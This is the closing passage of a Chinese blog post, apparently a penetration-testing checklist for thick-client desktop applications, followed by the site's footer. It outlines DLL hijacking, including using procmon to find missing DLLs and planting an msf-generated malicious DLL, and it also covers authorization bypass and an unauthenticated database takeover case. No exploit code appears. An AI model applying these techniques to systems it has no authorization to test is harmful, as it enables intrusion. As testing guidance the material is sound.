+<p><a href="http://blog.knownsec.com/2018/11/印象笔记-windows-客户端-6-15-本地文件读取和远程命令执行/" target="_blank" rel="noopener">http://blog.knownsec.com/2018/11/%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0-windows-%E5%AE%A2%E6%88%B7%E7%AB%AF-6-15-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>
+<br> 
+
+<p>案例1-某云pc客户端命令执行挖掘过程 </p>
+<p><a href="https://www.secpulse.com/archives/53852.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/53852.html</a></p>
+<br> 
+
+<p>案例2-金山WPS Mail邮件客户端远程命令执行漏洞(Mozilla系XUL程序利用技巧) </p>
+<p><a href="https://shuimugan.com/bug/view?bug_no=193117" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=193117</a></p>
+<br> 
+
+<h4 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a><strong>逻辑缺陷</strong></h4><p>测试点同web。</p>
+<br>  
+
+<h4 id="密码明文传输"><a href="#密码明文传输" class="headerlink" title="密码明文传输"></a><strong>密码明文传输</strong></h4><br> 
+
+<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a><strong>DLL劫持</strong></h4><p>Linux文件搜索顺序：</p>
+<ol>
+<li><p>当前目录</p>
+</li>
+<li><p>PATH顺序值目录</p>
+</li>
+</ol>
+<br>
+
+<p>程序搜索Dll顺序：</p>
+<p>//没提供绝对路径</p>
+<p>1.应用程序加载的目录。</p>
+<p>2.当前目录。</p>
+<p>3.系统目录 (C:\Windows\System32\)。</p>
+<p>4.16位的系统目录。</p>
+<p>5.Windows目录。</p>
+<p>6.PATH变量的目录。</p>
+<p>程序可以加载攻击者放置的恶意dll。</p>
+<p>利用procmon搜索程序加载的dll，观察name not found。</p>
+<p>msf生成恶意dll放置于程序加载位置，运行程序即可触发payload。</p>
+<br> 
+
+<p>案例0-dll劫持</p>
+<p>dvta</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs20.png" alt="cs20"></p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs21.png" alt="cs21"></p>
+<br>
+
+<h4 id="授权认证缺陷"><a href="#授权认证缺陷" class="headerlink" title="授权认证缺陷"></a><strong>授权认证缺陷</strong></h4><p>注册表键值，授权服务器返回信息构造。</p>
+<p>相关参考</p>
+<p><a href="https://cloud.tencent.com/developer/article/1430899" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1430899</a></p>
+<br> 
+
+<h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a><strong>越权</strong></h4><br> 
+
+<h4 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a><strong>未授权</strong></h4><br> 
+
+<p>案例0-正方教务系统数据库任意操作</p>
+<p>知道ip即可接管数据库</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs22.png" alt="cs22"></p>
+<p>//本案例来源于wooyun</p>
+<br>
+
+<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a><strong>溢出</strong></h4><p><br><br></p>
+<h2 id="0x08-相关技巧"><a href="#0x08-相关技巧" class="headerlink" title="0x08 相关技巧"></a><strong>0x08 相关技巧</strong></h2><p>1.wireshark直接过滤出服务器或数据库的ip或协议方便查看，如</p>
+<p>ip.addr == 1.2.3.4&amp;&amp;http</p>
+<p>2.如果有数据库账号，可以用数据库监控sql语句操作（如sql server profiler）。</p>
+<p><br><br> </p>
+<h2 id="0x09-参考资料-amp-amp-相关资源"><a href="#0x09-参考资料-amp-amp-相关资源" class="headerlink" title="0x09 参考资料&amp;&amp;相关资源"></a><strong>0x09 参考资料&amp;&amp;相关资源</strong></h2><p><a href="https://resources.infosecinstitute.com/" target="_blank" rel="noopener">https://resources.infosecinstitute.com</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag"># 记录</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/09/17/%E5%85%A5%E4%BE%B5%E5%85%A8%E7%90%83%E5%AE%89%E5%8D%93%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E2%80%93PhoneSploit/" rel="next" title="入侵全球安卓智能设备–PhoneSploit">
+                  <i class="fa fa-chevron-left"></i> 入侵全球安卓智能设备–PhoneSploit
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/" rel="prev" title="vssadmin获取NTDS实操">
+                  vssadmin获取NTDS实操 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NzQ3My8yMzk3Mw=="></div>
+  </div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CS-checklist"><span class="nav-number">1.</span> <span class="nav-text">CS-checklist</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#目录"><span class="nav-number">1.1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.2.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-概述"><span class="nav-number">1.3.</span> <span class="nav-text">0x01 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-开发语言"><span class="nav-number">1.4.</span> <span class="nav-text">0x02 开发语言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-协议"><span class="nav-number">1.5.</span> <span class="nav-text">0x03 协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-数据库"><span class="nav-number">1.6.</span> <span class="nav-text">0x04 数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-测试工具"><span class="nav-number">1.7.</span> <span class="nav-text">0x05 测试工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-代理设置"><span class="nav-number">1.8.</span> <span class="nav-text">0x06 代理设置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-测试点"><span class="nav-number">1.9.</span> <span class="nav-text">0x07 测试点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-信息收集"><span class="nav-number">1.9.1.</span> <span class="nav-text">0. 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-逆向工程"><span class="nav-number">1.9.2.</span> <span class="nav-text">1. 逆向工程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-信息泄露"><span class="nav-number">1.9.3.</span> <span class="nav-text">2. 信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-传输流量"><span class="nav-number">1.9.4.</span> <span class="nav-text">3. 传输流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-其他漏洞"><span class="nav-number">1.9.5.</span> <span class="nav-text">4. 其他漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#爆破"><span class="nav-number">1.9.5.1.</span> <span class="nav-text">爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用户名枚举"><span class="nav-number">1.9.5.2.</span> <span class="nav-text">用户名枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL语句暴露"><span class="nav-number">1.9.5.3.</span> <span class="nav-text">SQL语句暴露</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.9.5.4.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSV注入"><span class="nav-number">1.9.5.5.</span> <span class="nav-text">CSV注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#弱口令"><span class="nav-number">1.9.5.6.</span> <span class="nav-text">弱口令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-number">1.9.5.7.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行"><span class="nav-number">1.9.5.8.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逻辑缺陷"><span class="nav-number">1.9.5.9.</span> <span class="nav-text">逻辑缺陷</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密码明文传输"><span class="nav-number">1.9.5.10.</span> <span class="nav-text">密码明文传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DLL劫持"><span class="nav-number">1.9.5.11.</span> <span class="nav-text">DLL劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#授权认证缺陷"><span class="nav-number">1.9.5.12.</span> <span class="nav-text">授权认证缺陷</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#越权"><span class="nav-number">1.9.5.13.</span> <span class="nav-text">越权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#未授权"><span class="nav-number">1.9.5.14.</span> <span class="nav-text">未授权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#溢出"><span class="nav-number">1.9.5.15.</span> <span class="nav-text">溢出</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-相关技巧"><span class="nav-number">1.10.</span> <span class="nav-text">0x08 相关技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-参考资料-amp-amp-相关资源"><span class="nav-number">1.11.</span> <span class="nav-text">0x09 参考资料&amp;&amp;相关资源</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="LionKing"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">LionKing</p>
+  <div class="site-description" itemprop="description">安全小白，打算用一些方式记录现在以及未来在这个行业中成长的心路历程。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://3gstudent.github.io/" title="https:&#x2F;&#x2F;3gstudent.github.io&#x2F;" rel="noopener" target="_blank">3gstudent</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.hl0rey.com/archives/" title="https:&#x2F;&#x2F;blog.hl0rey.com&#x2F;archives&#x2F;" rel="noopener" target="_blank">hl0rey</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/micr067/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;micr067&#x2F;" rel="noopener" target="_blank">Micr067</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://patrilic.top/archives/" title="https:&#x2F;&#x2F;patrilic.top&#x2F;archives&#x2F;" rel="noopener" target="_blank">Patrilic</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.csdn.net/qq_29647709" title="https:&#x2F;&#x2F;me.csdn.net&#x2F;qq_29647709" rel="noopener" target="_blank">tdcoming</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://uknowsec.cn/" title="https:&#x2F;&#x2F;uknowsec.cn&#x2F;" rel="noopener" target="_blank">uknow</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://422926799.github.io/" title="https:&#x2F;&#x2F;422926799.github.io&#x2F;" rel="noopener" target="_blank">九世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://payloads.online/" title="https:&#x2F;&#x2F;payloads.online&#x2F;" rel="noopener" target="_blank">倾旋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wiki.17-apt.tk/" title="https:&#x2F;&#x2F;wiki.17-apt.tk&#x2F;" rel="noopener" target="_blank">BugMan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://attack.mitre.org/matrices/enterprise/" title="https:&#x2F;&#x2F;attack.mitre.org&#x2F;matrices&#x2F;enterprise&#x2F;" rel="noopener" target="_blank">ATT&CK</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fireeye.com/blog.html" title="https:&#x2F;&#x2F;www.fireeye.com&#x2F;blog.html" rel="noopener" target="_blank">FireEye</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LionKing</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+</body>
+</html>
